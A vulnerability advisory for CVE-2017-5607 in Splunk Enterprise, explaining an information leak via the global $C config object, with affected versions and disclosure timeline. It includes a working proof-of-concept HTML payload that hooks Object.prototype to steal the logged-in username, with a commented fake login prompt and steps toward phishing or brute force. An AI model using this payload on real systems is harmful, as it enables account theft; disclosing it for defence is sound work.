@@ -1,0 +1,142 @@
+[+] Credits: John Page AKA hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/SPLUNK-ENTERPRISE-INFORMATION-THEFT.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+===============
+www.splunk.com
+
+
+
+Product:
+==================
+Splunk Enterprise 
+
+
+Splunk provides the leading platform for Operational Intelligence. Customers use Splunk to search, monitor, analyze
+and visualize machine data. Splunk Enterprise, collects and analyzes high volumes of machine-generated data.
+
+
+
+Vulnerability Type:
+==================================
+Javascript (JSON) Information Theft
+
+
+
+CVE Reference:
+==============
+CVE-2017-5607
+
+
+
+Security Issue:
+================
+Attackers can siphon information from Splunk Enterprise if an authenticated Splunk user visits a malicious webpage.
+Some useful data gained is the currently logged in username and if remote user setting is enabled. After, the username
+can be use to Phish or Brute Force Splunk Enterprise login. Additional information stolen may aid in furthering attacks.
+
+Root cause is the global Window JS variable assignment of config?autoload=1 '$C'.
+
+e.g.
+
+window.$C = {"BUILD_NUMBER": 207789, "SPLUNKD_PATH"... etc... }
+
+To steal information we simply can define a function to be called when the '$C' JS property is "set" on webpage, for example.
+Object.defineProperty( Object.prototype, "$C", { set:function(val){...
+
+The Object prototype is a Object that every other object inherits from in JavaScript, if we create a setter on the name of our target
+in this case "$C", we can get/steal the value of this data, in this case it is very easy as it is assigned to global Window namespace.
+
+
+Affected Splunk Enterprise versions:
+6.5.x before 6.5.3
+6.4.x before 6.4.6
+6.3.x before 6.3.10
+6.2.x before 6.2.13.1
+6.1.x before 6.1.13
+6.0.x before 6.0.14
+5.0.x before 5.0.18 and Splunk Light before 6.5.2
+
+Vulnerability could allow a remote attacker to obtain logged-in username and Splunk version-related information via JavaScript.
+
+
+References:
+=============
+https://www.splunk.com/view/SP-CAAAPZ3
+https://www.splunk.com/view/SP-CAAAPZ3#InformationLeakageviaJavaScriptCVE20175607
+
+
+
+Exploit/POC:
+=============
+
+Reproduction:
+
+1) Log into Splunk
+2) place the below Javascript in webpage on another server.
+
+"Splunk-Data-Theft.html"  
+
+<script>
+Object.defineProperty( Object.prototype, "$C", { set:function(val){ 
+   //prompt("Splunk Timed out:\nPlease Login to Splunk\nUsername: "+val.USERNAME, "Password")
+for(var i in val){
+ alert(""+i+" "+val[i]);
+  }
+ }
+});
+</script>
+
+
+<script src="https://VICTIM-IP:8000/en-US/config?autoload=1"></script>
+
+
+3) Visit the server hosting the "Splunk-Data-Theft.html" webpage, grab current authenticated user
+4) Phish or brute force the application.
+
+
+
+Video POC URL:
+===============
+https://vimeo.com/210634562
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Impact:
+=======================
+Information Disclosure
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+===================================================
+Vendor Notification:  November 30, 2016
+Vendor Acknowledgement: December 2, 2016
+Vendor Release Splunk 6.5.3 / Patch : March 30, 2017
+March 31, 2017  : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
